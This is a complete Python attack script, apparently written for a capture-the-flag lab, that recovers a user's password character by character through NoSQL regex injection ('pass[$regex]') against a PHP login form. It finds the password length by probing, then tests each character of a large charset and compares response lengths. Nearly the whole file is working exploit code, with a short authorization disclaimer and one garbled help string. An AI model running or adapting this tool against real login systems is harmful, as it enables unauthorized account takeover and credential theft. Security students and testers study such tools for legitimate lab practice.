#!/usr/bin/env python3
"""
ctf_charbychar.py

Character-by-character password discovery using a regex POST parameter like:
    pass[$regex]=^...$

Includes special characters set requested by the user and escapes candidates
so regex metacharacters don't break the probe.

Example:
  python3 ctf_charbychar.py --url http://10.10.154.23/login.php --user pedro --cookie 'PHPSESSID=abc' --max-len 20

Only use on machines you are authorized to test.
"""
import argparse
import requests
import sys
import time
import string
import re

# Try to import colorit; if unavailable, provide a compatible fallback.
try:
    from colorit import *
    init_colorit()
    # color(text, (r,g,b)) is the expected call
    def safe_color(text, rgb):
        return color(text, rgb)
    PURPLE = (145, 31, 186)
except Exception:
    # simple fallback so the API matches colorit.color(text, rgb)
    def safe_color(text, rgb=None):
        return text
    PURPLE = (145, 31, 186)

# default charset includes letters, digits and the requested special characters
SPECIAL_CHARS = "#$%&()*+,-./:;<=>?@[]^_`{|}~"
DEFAULT_CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + SPECIAL_CHARS


def build_session(cookie_string: str, host: str):
    s = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": host,
        "Referer": host + "/",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    s.headers.update(headers)
    if cookie_string:
        # cookie string like "PHPSESSID=...; other=..."
        for part in cookie_string.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                s.cookies.set(k, v)
    return s


def post_probe(session, url, username, regex_pattern, timeout=8.0):
    """
    Perform the POST probing request. Returns (status_code, response_text)
    On network error returns (None, error_message)
    """
    data = {
        "user": username,
        "pass[$regex]": regex_pattern,
        "remember": "on"
    }
    try:
        r = session.post(url, data=data, timeout=timeout)
        return r.status_code, r.text
    except requests.RequestException as e:
        return None, f"REQUEST-ERROR: {e}"


def detect_length(session, url, username, max_len, baseline_pattern="^nomatch$"):
    """
    Try detecting the password length by probing ^.{n}$ for n = 1..max_len.
    Returns (length_found_or_None, baseline_len)
    """
    code, baseline_body = post_probe(session, url, username, baseline_pattern)
    if code is None:
        print("Network error while getting baseline:", baseline_body)
        sys.exit(1)
    baseline_len = len(baseline_body)

    for n in range(1, max_len + 1):
        patt = "^" + "." * n + "$"   # ^.{n}$
        code, body = post_probe(session, url, username, patt)
        if code is None:
            print("Network error while detecting length:", body)
            sys.exit(1)
        if len(body) != baseline_len:
            # We assume a difference indicates a match for length n
            return n, baseline_len
    return None, baseline_len


def discover_password(session, url, username, length, baseline_len, charset, success_marker=None, delay=0.0):
    """
    Discover password of given length using the provided charset.
    If success_marker is provided, a case-insensitive substring match in response body
    indicates a successful match instead of comparing body length.
    Returns (found_string, boolean_indicating_full_success)
    """
    found = ""
    for pos in range(length):
        matched_this_pos = False
        for ch in charset:
            # Escape prefix+candidate to avoid injecting regex metacharacters
            remaining = length - (pos + 1)
            escaped_prefix_and_char = re.escape(found + ch)
            patt = "^" + escaped_prefix_and_char + ("." * remaining) + "$"
            code, body = post_probe(session, url, username, patt)
            if code is None:
                print("Network error:", body)
                sys.exit(1)

            matched = False
            if success_marker:
                if success_marker.lower() in body.lower():
                    matched = True
            else:
                if len(body) != baseline_len:
                    matched = True

            if matched:
                found += ch
                matched_this_pos = True
                print(f"Found so far: {found}")
                break
            # else try next char

        if not matched_this_pos:
            # No char matched at this position
            print(f"No character from charset matched at position {pos + 1}. Current prefix: '{found}'")
            return found, False

        if delay:
            time.sleep(delay)

    return found, True


def main():
    p = argparse.ArgumentParser(
        description="Discover password char-by-char via pass[$regex] POST.",
        epilog="Example: python3 me1.py --url http://10.10.154.23/login.php --user pedro --cookie 'PHPSESSID=abc' --max-len 20"
    )
    p.add_argument("--url", "-u", required=True, help="Full URL to POST to (e.g. http://10.10.154.23/login.php)")
    p.add_argument("--user", default="pedro", help="username value")
    p.add_argument("--cookie", help="cookie string (e.g. 'PHPSESSID=...')", default=None)
    p.add_argument("--max-len", type=int, default=30, help="max length to probe for password length")
    p.add_argument("--charset", default=DEFAULT_CHARSET,
                   help="characters to try (order matters). Default: letters+digits+specials")
    p.add_argument("--success-marker", help="optional response substring that indicates a positive match", default=None)
    p.add_argument("--delay", type=float, default=0.0, help="dDark-Shellelay between tries in seconds")
    args = p.parse_args()

    # banner — raw string to avoid escape sequence warnings
    banner = r'''
    ____                       ____  _                      
   / __ \___  ____ ____  _  __/ __ \(_)___  ____  ___  _____
  / /_/ / _ \/ __ `/ _ \| |/_/ /_/ / / __ \/ __ \/ _ \/ ___/
 / _, _/  __/ /_/ /  __/>  </ _, _/ / /_/ / /_/ /  __/ /    
/_/ |_|\___/\__, /\___/_/|_/_/ |_/_/ .___/ .___/\___/_/     
           /____/                 /_/   /_/                 
Drink Coffee                                        Author: HIJACKED1
'''
    # Use safe_color which wraps colorit when available
    print(safe_color(banner, PURPLE))

    # parse host for headers (expects scheme present in URL)
    try:
        parts = args.url.split("://", 1)
        host = parts[0] + "://" + parts[1].split("/")[0]
    except Exception:
        print("Error parsing host from URL. Make sure --url includes the scheme (http:// or https://).")
        sys.exit(1)

    session = build_session(args.cookie, host)

    print("Detecting password length (max {})...".format(args.max_len))
    length, baseline_len = detect_length(session, args.url, args.user, args.max_len)
    if length is None:
        print("Could not detect password length up to", args.max_len)
        sys.exit(1)
    print("Password length found:", length)

    print("Starting character discovery...")
    pwd, ok = discover_password(session, args.url, args.user, length, baseline_len, args.charset, success_marker=args.success_marker, delay=args.delay)
    if ok:
        print(safe_color("[#] - Full password: " + pwd, PURPLE))
    else:
        print("Partial password found:", pwd)


if __name__ == "__main__":
    main()
